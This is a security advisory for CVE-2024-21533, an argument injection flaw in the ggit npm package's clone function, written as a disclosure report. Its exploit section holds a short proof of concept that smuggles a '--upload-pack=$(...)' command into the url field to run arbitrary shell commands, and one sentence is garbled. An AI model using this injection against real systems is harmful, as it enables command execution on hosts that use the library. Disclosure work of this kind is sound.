# CVE-2024-21533 Argument Injection vulnerability in ggit

`ggit` describes itself as:

```
Local promise-returning git command wrappers
```

Resources: 
 * Project's GitHub source code: https://github.com/bahmutov/ggit
 * Project's npm package: https://www.npmjs.com/package/ggit

Article write-up on this argument injection vulnerability: https://nodejs-security.com/blog/flawed-git-promises-library-on-npm-leads-to-command-injection-vulnerability

## Background on exploitation

I'm reporting an Argument Injection vulnerability in `ggit` npm package.

This vulnerability manifests with the library's `clone()` API,
which allows specifying the remote URL to clone and the file on disk to clone to.
However, the library does not sanitize for user input or validate a given URL scheme,
nor does it properly pass command-line flags to the `git` binary using the double-dash
POSIX characters (`--`) to communicate the end of options.

Thus, allowing users to exploit an argument injection vulnerability in Git due to the
`--upload-pack` command-line option that results with executing arbirary commands.
(`outPath`) to clone it to then the vulnerability applies.

## Exploit

1. Install `ggit@2.4.12` or earlier
2. Establish the following POC:

```js
const clone = require("ggit").cloneRepo;
clone({
  url: "--upload-pack=$(touch /tmp/pwned)",
  folder: "/tmp/dbd",
}).then(function () {
  console.log("cloned repo to destination folder");
});
```

3. Observe new file created on disk at `/tmp/pwned`

# Author

Liran Tal
